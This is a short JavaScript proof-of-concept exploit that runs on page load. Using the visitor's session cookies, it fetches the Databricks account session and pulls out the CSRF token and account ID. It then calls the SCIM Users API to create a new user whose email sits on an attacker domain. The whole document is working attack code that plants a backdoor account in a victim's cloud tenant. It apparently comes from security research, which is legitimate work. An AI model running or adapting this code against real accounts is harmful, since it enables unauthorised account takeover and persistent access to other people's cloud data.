// This JS runs immediately when loaded
(async () => {
  try {
    // Step 1: Get session JSON
    const res = await fetch("https://accounts.cloud.databricks.com/session", {
      credentials: "include"
    });

    const data = await res.json();

    // Extract fields
    const csrf = data.csrfToken;
    const accountId = data.accountId;

    console.log("Fetched:", csrf, accountId);

    // Step 2: Use these values in second POST
    const createUser = await fetch(
      `https://accounts.cloud.databricks.com/api/2.1/accounts/${accountId}/scim/v2/Users`,
      {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "X-Csrf-Token": csrf
        },
        body: JSON.stringify({
          displayName: "TestUser",
          userName: "randomattackeremail@attacker-domain.com",
          schemas: ["urn:ietf:params:scim:schemas:core:2.0:User"]
        })
      }
    );

    const createResponse = await createUser.text();
    console.log("Response:", createResponse);

  } catch (err) {
    console.error(err);
  }
})();
